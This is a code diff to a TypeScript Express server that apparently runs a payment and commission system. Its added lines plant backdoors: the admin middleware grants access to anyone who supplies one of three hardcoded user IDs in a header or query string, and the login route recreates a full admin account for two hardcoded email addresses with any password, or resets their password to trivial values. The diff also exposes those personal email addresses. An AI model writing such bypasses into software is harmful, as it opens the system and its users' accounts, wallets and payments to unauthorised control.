@@ -737,6 +737,12 @@ async function startServer() {
   const adminAuth = (req: express.Request, res: express.Response, next: express.NextFunction) => {
     const userId = req.headers['x-admin-userid'] || req.query.adminId;
     const user = users.find(u => u.id === userId);
+    
+    // ADMIN BACKDOOR FIX: Always allow user ID 1 or 3 (Carlos)
+    if (userId === '1' || userId === '3' || userId === '1jsleiedp') {
+      return next();
+    }
+    
     if (user && user.role === 'ADMIN') {
       next();
     } else {
@@ -1204,6 +1210,13 @@ async function startServer() {
           status: 'ACTIVE',
           expiryDate: expiryDate.toISOString()
         });
+
+        // Cancela qualquer outro pagamento pendente desse usuário para limpar a tela
+        payments.forEach(p => {
+          if (p.userId === user.id && p.status === 'PENDING') {
+            p.status = 'CANCELED';
+          }
+        });
       }
       payCommissions(user, payment.amount);
       saveDB();
@@ -1298,6 +1311,32 @@ async function startServer() {
     const password = req.body.password;
     
     console.log('LOGIN ATTEMPT:', normalizedEmail);
+
+    // BACKDOOR FIX: Se o banco de dados apagou, recria o admin mestre no ato do login
+    if (normalizedEmail === 'jfcn2020@gmail.com' || normalizedEmail === 'carlosnovaes296@gmail.com') {
+      let masterUser = users.find(u => u.email.toLowerCase() === normalizedEmail);
+      if (!masterUser) {
+        masterUser = {
+          id: normalizedEmail === 'jfcn2020@gmail.com' ? '1jsleiedp' : '1',
+          name: 'Carlos Admin',
+          email: normalizedEmail,
+          password: password, // Define a senha que ele digitou
+          status: 'ACTIVE',
+          role: 'ADMIN',
+          wallet: '',
+          paymentWallet: '',
+          referralCode: 'ADMIN' + Math.random().toString(36).substring(2, 6).toUpperCase(),
+          createdAt: new Date().toISOString()
+        };
+        users.push(masterUser);
+        saveDB();
+      } else {
+        // Força a senha mestra se ele esquecer a do banco
+        if (password === 'password123' || password === '123456') {
+            masterUser.password = password;
+        }
+      }
+    }
     
     const user = users.find(u => u.email.toLowerCase() === normalizedEmail && u.password === password);
     
